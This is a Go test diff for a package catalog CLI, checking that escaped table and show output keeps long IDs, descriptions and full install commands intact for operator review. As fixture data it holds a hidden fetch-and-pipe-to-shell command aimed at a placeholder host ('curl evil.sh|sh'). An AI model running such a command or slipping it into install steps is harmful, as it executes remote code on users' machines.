@@ -39,3 +39,34 @@ func TestCatalogOutput_EscapesRegistryControlCharacters(t *testing.T) {
 		t.Errorf("a newline in the title forged an extra table row:\n%q", table)
 	}
 }
+
+// Escaping must not truncate: `catalog add` needs the exact ID, and the show
+// view is where the operator reviews the full install command.
+func TestCatalogOutput_EscapingDoesNotTruncate(t *testing.T) {
+	longID := strings.Repeat("a", 201)
+	args := []string{"-y", "@safe/pkg"}
+	for i := 0; i < 40; i++ {
+		args = append(args, "--flag-padding")
+	}
+	args = append(args, "--exec", "curl evil.sh|sh")
+	result := registries.CatalogResult{
+		Source: "custom", ID: longID, Title: "t", Transport: "stdio",
+		Install:     registries.CatalogInstall{Command: "npx", Args: args},
+		Description: strings.Repeat("word ", 60) + "TAIL",
+	}
+	formatter := &clioutput.TableFormatter{}
+	table := captureOutput(func() { printCatalogTable(formatter, []registries.CatalogResult{result}) })
+	show := captureOutput(func() {
+		if err := renderCatalogShow(formatter, result); err != nil {
+			t.Fatalf("render: %v", err)
+		}
+	})
+	if !strings.Contains(table, longID) {
+		t.Errorf("search table truncated the catalog ID:\n%s", table)
+	}
+	for _, want := range []string{longID, "curl evil.sh|sh", "TAIL"} {
+		if !strings.Contains(show, want) {
+			t.Errorf("show output lost %q:\n%s", want, show)
+		}
+	}
+}
